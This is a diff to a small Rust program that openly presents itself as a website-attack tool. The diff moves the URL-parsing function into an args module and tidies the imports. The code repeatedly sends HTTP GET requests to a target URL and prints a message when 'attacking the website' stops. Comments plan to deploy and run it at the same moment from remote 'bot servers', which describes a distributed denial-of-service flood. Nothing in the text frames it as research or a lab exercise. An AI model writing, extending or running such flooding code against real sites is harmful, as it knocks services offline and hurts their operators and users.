@@ -1,19 +1,16 @@
 extern crate easy_http_request;
-extern crate regex;
 
 mod args;
 mod io;
 
 use easy_http_request::DefaultHttpRequest;
-use regex::Regex;
-use std::process;
-use std::{thread, time};
+use std::{process, thread, time};
 
 // XXX: remotely call bot servers and deploy this script and dependencies
 // XXX: remotely call bot servers and execute this program simultaneously
 
 fn main() {
-    if io::read_line(get_url()) == "" {
+    if io::read_line(args::get_url()) == "" {
         println!("\nYou stoped attacking the website.\n");
         process::exit(0x0100);         
     }
@@ -32,26 +29,8 @@ fn main() {
     }
 }
 
-fn get_url() -> String {
-    let (_options, _args) = args::parse();
-
-    if _args.len() < 2 {
-        println!("\nURL missing!\n");
-        process::exit(0x0100);         
-    }
-
-    let url = _args[1].to_string();
-    let re  = Regex::new(r"^http[s]{0,1}://").unwrap();
-
-    if !re.is_match(&url) {
-        return format!("https://{}", url);
-    }
-
-    return url; 
-}
-
 fn ping_many_times(x: i32) {
-    let response = DefaultHttpRequest::get_from_url_str(get_url())
+    let response = DefaultHttpRequest::get_from_url_str(args::get_url())
                        .unwrap()
                        .send  ()
                        .unwrap();
